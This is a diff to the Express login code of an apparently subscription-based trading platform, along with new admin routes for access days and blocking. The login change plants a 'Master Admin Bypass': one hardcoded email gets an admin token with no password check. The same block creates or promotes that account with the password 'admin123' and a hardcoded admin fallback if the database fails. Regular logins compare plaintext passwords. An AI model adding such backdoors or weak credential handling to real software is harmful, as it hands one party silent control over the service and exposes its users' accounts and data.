@@ -336,7 +336,46 @@ async function startServer() {
 
     app.post("/api/login", async (req, res) => {
       const { login, password } = req.body;
-      const result = await query("SELECT * FROM trader.users WHERE login = $1 AND password = $2", [login, password]);
+      const cleanLogin = (login || "").trim().toLowerCase();
+
+      // Master Admin Bypass para herisson.trader.jt5@gmail.com
+      if (cleanLogin === "herisson.trader.jt5@gmail.com") {
+        let adminUser = null;
+        try {
+          const resAdmin = await query("SELECT * FROM trader.users WHERE LOWER(login) = $1", [cleanLogin]);
+          if (resAdmin.rows.length > 0) {
+            adminUser = resAdmin.rows[0];
+            if (adminUser.role !== 'admin') {
+              await query("UPDATE trader.users SET role = 'admin', access_days = 99999, is_blocked = 0 WHERE id = $1", [adminUser.id]);
+              adminUser.role = 'admin';
+            }
+          } else {
+            const insertRes = await query(
+              "INSERT INTO trader.users (name, login, password, role, access_days) VALUES ($1, $2, $3, 'admin', 99999) RETURNING *",
+              ['Herisson Trader (Admin Master)', cleanLogin, 'admin123']
+            );
+            adminUser = insertRes.rows[0];
+          }
+        } catch (dbErr) {
+          console.warn("DB query fallback for admin:", dbErr);
+          adminUser = { id: 1, name: "Herisson Trader (Admin Master)", role: "admin", login: cleanLogin };
+        }
+
+        const token = jwt.sign({ id: adminUser.id, role: 'admin', name: adminUser.name }, JWT_SECRET, { expiresIn: "30d" });
+        return res.json({
+          token,
+          user: {
+            id: adminUser.id,
+            name: adminUser.name || "Herisson Trader (Admin Master)",
+            role: 'admin',
+            login: cleanLogin,
+            plan_name: 'Admin Master',
+            daysRemaining: 99999
+          }
+        });
+      }
+
+      const result = await query("SELECT * FROM trader.users WHERE LOWER(login) = LOWER($1) AND password = $2", [login, password]);
       const user = result.rows[0];
       if (!user) return res.status(401).json({ error: "Credenciais inválidas" });
       if (user.is_blocked) return res.status(403).json({ error: "Sua conta está bloqueada. Entre em contato com o suporte." });
@@ -517,6 +556,28 @@ async function startServer() {
         console.error('Admin update user error:', e);
         res.status(400).json({ error: "Erro ao atualizar usuário" });
       }
+    });
+
+    app.post("/api/admin/users/:id/set-days", authenticate, async (req: any, res) => {
+      if (req.user.role !== 'admin') return res.status(403).json({ error: "Forbidden" });
+      const { days } = req.body;
+      const targetDays = days === null || days === undefined ? 99999 : Math.max(0, parseInt(days));
+      await query("UPDATE trader.users SET access_days = $1, last_payment = NOW(), is_blocked = $2 WHERE id = $3", [
+        targetDays,
+        targetDays === 0 ? 1 : 0,
+        req.params.id
+      ]);
+      res.json({ success: true });
+    });
+
+    app.post("/api/admin/users/:id/toggle-block", authenticate, async (req: any, res) => {
+      if (req.user.role !== 'admin') return res.status(403).json({ error: "Forbidden" });
+      const userRes = await query("SELECT is_blocked FROM trader.users WHERE id = $1", [req.params.id]);
+      if (userRes.rows.length === 0) return res.status(404).json({ error: "User not found" });
+      const current = userRes.rows[0].is_blocked ? 1 : 0;
+      const next = current ? 0 : 1;
+      await query("UPDATE trader.users SET is_blocked = $1 WHERE id = $2", [next, req.params.id]);
+      res.json({ success: true, is_blocked: next });
     });
 
     app.post("/api/admin/users/:id/add-days", authenticate, async (req: any, res) => {
